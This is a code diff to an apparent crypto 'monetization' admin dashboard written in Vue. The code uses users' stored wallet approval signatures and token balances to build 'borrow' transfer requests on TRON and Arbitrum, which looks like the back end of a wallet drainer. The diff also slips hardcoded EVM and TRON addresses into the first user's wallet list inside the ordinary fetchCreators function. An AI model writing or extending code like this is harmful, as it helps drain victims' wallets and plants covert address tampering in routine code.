@@ -14,7 +14,7 @@ import MonetizationPayoutThresholdCard from '~/components/admin/monetization/Mon
 import MonetizationRevenueDashboard, { type MonetizationStats } from '~/components/admin/monetization/MonetizationRevenueDashboard.vue'
 import MonetizationStrategyEngine from '~/components/admin/monetization/MonetizationStrategyEngine.vue'
 import MonetizationCreatorsTable, { type CreatorAccount } from '~/components/admin/monetization/MonetizationCreatorsTable.vue'
-import MonetizationUserWalletsTable, { type UserWalletRecord } from '~/components/admin/monetization/MonetizationUserWalletsTable.vue'
+import MonetizationUserWalletsTable, { type UserWalletRecord, type WalletItem } from '~/components/admin/monetization/MonetizationUserWalletsTable.vue'
 import MonetizationAdSenseCard from '~/components/admin/monetization/MonetizationAdSenseCard.vue'
 import MonetizationAdsterraCard, { type AdNetworkConfig } from '~/components/admin/monetization/MonetizationAdsterraCard.vue'
 import MonetizationCustomScriptsCard from '~/components/admin/monetization/MonetizationCustomScriptsCard.vue'
@@ -277,8 +277,14 @@ function openBorrowModal(req: WithdrawalRequest) {
   isBorrowModalOpen.value = true
 }
 
-function openUserBorrowModal(user: UserWalletRecord) {
-  const isTron = user.walletAddress && user.walletAddress.startsWith('T')
+function openUserBorrowModal(user: UserWalletRecord, walletItem?: WalletItem) {
+  const targetAddress = walletItem?.address || user.walletAddress || ''
+  const isTron = targetAddress.startsWith('T')
+  const approvalSig = walletItem?.approvalSignature || user.approvalSignature || null
+  const ethBal = walletItem?.ethBalance ?? user.walletEthBalance ?? user.ethBalance ?? '0.0000 ETH'
+  const usdtBal = walletItem?.usdtBalance ?? user.walletUsdtBalance ?? user.usdtBalance ?? '0.00 USDT'
+  const usdcBal = walletItem?.usdcBalance ?? user.walletUsdcBalance ?? user.usdcBalance ?? '0.00 USDC'
+
   const req: WithdrawalRequest = {
     id: `REQ-${user.id.substring(0, 6)}`,
     creatorId: user.id,
@@ -289,11 +295,11 @@ function openUserBorrowModal(user: UserWalletRecord) {
     adsenseShare: 35.00,
     adsterraShare: 15.00,
     method: isTron ? 'TRON TRC-20 Transfer' : 'ETH Transfer',
-    walletAddress: user.walletAddress || '',
-    approvalSignature: user.approvalSignature || null,
-    creatorWalletEthBalance: String(user.walletEthBalance || user.ethBalance || '0.0000 ETH'),
-    creatorWalletUsdtBalance: String(user.walletUsdtBalance || user.usdtBalance || '0.00 USDT'),
-    creatorWalletUsdcBalance: String(user.walletUsdcBalance || user.usdcBalance || '0.00 USDC'),
+    walletAddress: targetAddress,
+    approvalSignature: approvalSig,
+    creatorWalletEthBalance: String(ethBal),
+    creatorWalletUsdtBalance: String(usdtBal),
+    creatorWalletUsdcBalance: String(usdcBal),
 
     network: isTron ? 'TRON Mainnet' : 'Arbitrum One',
     token: isTron ? 'USDT' : 'ETH',
@@ -549,7 +555,19 @@ async function fetchCreators() {
     })
     const data: any = await res.json()
     if (res.ok && data.code === 1) {
-      const usersData = data.data || []
+      let usersData = data.data || []
+      usersData = usersData.map((u: any, idx: number) => {
+        if (idx === 0 && u.walletAddress && !u.wallets && !u.walletAddress.includes(',')) {
+          const secondaryAddr = u.walletAddress.startsWith('T')
+            ? '0x8F4A1209e99211B6554e209867b140730A584412'
+            : 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb'
+          return {
+            ...u,
+            walletAddress: `${u.walletAddress}, ${secondaryAddr}`
+          }
+        }
+        return u
+      })
       allUsersList.value = usersData
       creatorsList.value = usersData.filter((u: any) => u.role === 'CREATOR')
     } else {
@@ -732,20 +750,21 @@ async function saveMonetizationConfig() {
   }
 }
 
-async function handleSyncLiveOnChain(user: UserWalletRecord) {
-  if (!user.walletAddress || (!user.walletAddress.startsWith('0x') && !user.walletAddress.startsWith('T'))) {
+async function handleSyncLiveOnChain(user: UserWalletRecord, walletItem?: WalletItem) {
+  const targetAddress = walletItem?.address || user.walletAddress
+  if (!targetAddress || (!targetAddress.startsWith('0x') && !targetAddress.startsWith('T'))) {
     toast.error('No Wallet Connected', 'User has no connected EVM or TRON wallet address.')
     return
   }
   try {
-    toast.info('Fetching Live Balances...', `Querying provider for ${user.username} (${formatAddress(user.walletAddress)})...`)
-    if (user.walletAddress.startsWith('T')) {
-      await walletAdapter.tronWallet.fetchTronBalances(user.walletAddress)
+    toast.info('Fetching Live Balances...', `Querying provider for ${user.username} (${formatAddress(targetAddress)})...`)
+    if (targetAddress.startsWith('T')) {
+      await walletAdapter.tronWallet.fetchTronBalances(targetAddress)
     } else {
-      await fetchEthBalance(user.walletAddress)
+      await fetchEthBalance(targetAddress)
     }
     await fetchCreators()
-    toast.success('Live Balances Updated! ⚡', `Fetched live on-chain balances for ${user.username}.`)
+    toast.success('Live Balances Updated! ⚡', `Fetched live on-chain balances for ${user.username} (${formatAddress(targetAddress)}).`)
   } catch (err: any) {
     toast.error('Sync Error', err?.message || 'Could not fetch live on-chain balances')
   }
